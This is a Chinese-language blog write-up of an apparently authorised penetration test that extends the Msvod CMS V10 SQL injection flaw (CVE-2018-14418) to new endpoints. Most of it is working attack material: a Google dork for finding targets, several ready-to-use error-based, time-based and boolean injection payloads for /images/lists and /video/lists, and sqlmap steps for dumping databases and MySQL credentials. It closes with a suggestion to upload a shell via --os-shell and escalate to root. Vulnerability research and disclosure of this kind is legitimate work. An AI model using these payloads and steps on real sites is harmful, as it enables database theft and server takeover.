<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="f3d11ff633dbe51ca2c69b153d135094">0x00 前言</h2>
<p>最近，一次授权的渗透测试项目意外的撞出了(CVE-2018-14418)新的火花，在这里分享给大家，同时简单记录一下自己的渗透测试过程，一些敏感信息已打码，相关漏洞已报送厂商修复。</p>
<h2 data-content="1" id="5b596f68bfc175364894188f5b02f959">0x01 Msvod Cms SQL注入漏洞原始</h2>
<h3 data-content="1" id="1c46792723ec41f7ef0033a0c5524d6b">详解</h3>
<table>
<thead>
<tr>
<th>漏洞ID</th>
<th>1226187</th>
<th>漏洞类型</th>
<th>SQL注入</th>
</tr>
</thead>
<tbody>
<tr>
<td>发布时间</td>
<td>2018-07-20</td>
<td>更新时间</td>
<td>2018-07-23</td>
</tr>
<tr>
<td>CVE编号</td>
<td>CVE-2018-14418</td>
<td>CNNVD-ID</td>
<td>CNNVD-201807-1724</td>
</tr>
<tr>
<td>漏洞平台</td>
<td>PHP</td>
<td>CVSS评分</td>
<td>N/A</td>
</tr>
</tbody>
</table>
<h3 data-content="1" id="d5197455472d9d00dff7d55db379499f">漏洞来源</h3>
<pre><code>https://www.exploit-db.com/exploits/45062
https://cxsecurity.com/issue/WLB-2018070221
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201807-1724</code></pre>
<h3 data-content="1" id="38675bc353d0208ae1d3d5eca7067c41">漏洞详情</h3>
<p>Msvod Cms是一套用于视频点播网站的内容管理系统（CMS）。该系统主要提供视频点播和视频聚合建站等服务。 Msvod Cms 10版本中存在SQL注入漏洞。远程攻击者利用该漏洞执行任意的SQL命令。</p>
<h3 data-content="1" id="e3cf5839f93e656abb3aa441d65c53b5">漏洞EXP0.1</h3>
<pre><code># Exploit Title: MSVOD V10 ¡V SQL Injection
# Google Dork: inurl:"images/lists?cid=13"
# Date: 2018/07/17
# Exploit Author: Hzllaga
# Vendor Homepage: http://www.msvod.cc/
# Version: MSVOD V10
# CVE : CVE-2018-14418
#Reference : https://www.wtfsec.org/2583/msvod-v10-sql-injection/

Payload:
/images/lists?cid=13%20)%20ORDER%20BY%201%20desc,extractvalue(rand(),concat(0x7c,database(),0x7c,user(),0x7c,@@version))%20desc%20--%20</code></pre>
<h2 data-content="1" id="3abe144ff7de6e730b2014cee65bebd8">0x02 Msvod Cms SQL注入漏洞擦出新火花</h2>
<h3 data-content="1" id="abe9534fb5f8216e76ff856bb5688737">资产收集</h3>
<p>指纹探测（此处推荐云悉指纹探测<a href="http://www.yunsee.cn/finger.html" target="_blank">http://www.yunsee.cn/finger.html</a>）</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902213717-c81f3206-cd86-1.png"/></p>
<p>Nmap扫描站点端口情况</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902213414-5a921b0e-cd86-1.png"/></p>
<h3 data-content="1" id="5e51202996a8e2edb85d455aab1755ac">手工测试分析</h3>
<p>手工测试发现站点存在伪静态</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902214246-8c4067b8-cd87-1.png"/></p>
<p>通过测试发现存在SQL Injection同时得知该站点是一个MsvodX的CMS</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902214448-d49e52e0-cd87-1.png"/></p>
<p>通过搜索得到该CMS版本存在SQL注入漏洞</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902214657-2195db4a-cd88-1.png"/></p>
<p>继续探索发现该漏洞原理和自己发现的本质一样</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902214840-5f24381c-cd88-1.png"/></p>
<p><strong>CVE-2018-14418 擦出新火花</strong></p>
<p>后面直接利用/video/lists?cid=num进行注入可以达到执行任意SQL命令</p>
<p>此处注入得到MySQL版本和用户信息</p>
<pre><code>Payload:

/video/lists?cid=13 ) AND extractvalue(rand(),concat(CHAR(126),(version()),CHAR(126)))--%20

/video/lists?cid=13 ) AND extractvalue(rand(),concat(CHAR(126),(user()),CHAR(126)))--%20</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902215614-6d80b150-cd89-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902215624-73beeeec-cd89-1.png"/></p>
<h3 data-content="1" id="ae630b9b99068d9be168720894349dcc">新的漏洞EXP</h3>
<h4 data-content="1" id="f78467c582f370223da7f7bf78b13c70">漏洞EXP1.1（/images/lists?cid=13）</h4>
<pre><code>Payload:
/images/lists?cid=13 ) ORDER BY if(1=1,1,sleep(3))--%20</code></pre>
<h4 data-content="1" id="8962d7b8164cbb05145a866e6220cf3c">漏洞EXP1.2（/images/lists?cid=13）</h4>
<pre><code>Payload:
/images/lists?cid=13 ) AND extractvalue(rand(),concat(CHAR(126),(version()),CHAR(126)))--%20</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902220025-03858be4-cd8a-1.png"/></p>
<h4 data-content="1" id="dea3a244b299d2083d23ae57678a2017">漏洞EXP1.3（/images/lists?cid=13）</h4>
<pre><code>Payload:
/images/lists?cid=34) AND 5072=5072 AND (7051=7051</code></pre>
<h4 data-content="1" id="7fe47faf2b1b44c89c4c12cb0af1d5d8">漏洞EXP2.1（在/video/lists?cid=13处发现新漏洞）</h4>
<pre><code>Payload:
/video/lists?cid=13 ) ORDER BY if(1=1,1,sleep(3))--%20</code></pre>
<h4 data-content="1" id="dbd6af7a7c0f40cec003d8a6938ed944">漏洞EXP2.2（在/video/lists?cid=13处发现新漏洞）</h4>
<pre><code>Payload:
/video/lists?cid=13 ) AND extractvalue(rand(),concat(CHAR(126),(user()),CHAR(126)))--%20</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902215624-73beeeec-cd89-1.png"/></p>
<h4 data-content="1" id="3bd67bb01f50af7a690e8bc01f2dc6f9">漏洞EXP2.3（在/video/lists?cid=13处发现新漏洞）</h4>
<pre><code>Payload:
/video/lists?cid=13 ) ORDER BY 1 desc,extractvalue(rand(),concat(0x7c,(user()),0x7c)) desc--%20</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190911093507-62b61ac4-d434-1.png"/></p>
<h4 data-content="1" id="f0f5fbd390a38470ede31611c2554127">漏洞EXP2.4（在/video/lists?cid=13处发现新漏洞）</h4>
<pre><code>Payload:
/video/lists?cid=34) AND 5072=5072 AND (7051=70510</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902220625-da09e458-cd8a-1.png"/></p>
<pre><code>Payload:
/video/lists?cid=34) AND 5072=5072 AND (7051=7051</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902220747-0af35dce-cd8b-1.png"/></p>
<h4 data-content="1" id="dfacb87cda915e123f02c2fe49c38597">漏洞EXP3.1（SQLMAP一键式）</h4>
<p>探测漏洞</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902220957-57e721c4-cd8b-1.png"/></p>
<p>爆库</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902221106-817a4106-cd8b-1.png"/></p>
<p>后面爆表爆字段不在细说（可以dump数据库）</p>
<p>读取MYSQL账户密码</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902221207-a59fd3de-cd8b-1.png"/></p>
<p>后面可以利用绝对路径对该Linux服务器上传shell(--os-shell)，之后找到服务器漏洞进行提权到root(你可以做一些你想做的事情！！！)</p>
<h4 data-content="1" id="461a3c599b284a0127f681f69b204e3d">漏洞EXP3.2（jsql-injection一键式）</h4>
<p>探测漏洞</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190902221528-1dbd597c-cd8c-1.png"/></p>
<p>ps:推荐此工具非常方便管理数据库</p>
<h4 data-content="1" id="fd8255a78090f6137e91188346865fdb">漏洞EXP4.1</h4>
<pre><code>Payload：
There are many！！！！！23333！！！</code></pre>
<h2 data-content="1" id="c2288802fb6c4f9490a9e5005f81ed66">0x03 总结</h2>
<p>SQL Injection漏洞在漏洞挖掘中还是比较常见的，对于SQL注入漏洞突破点还是在于数据的探索和处理上。关于漏洞的挖掘在于经验的积累和学习。</p>
</div>
</div>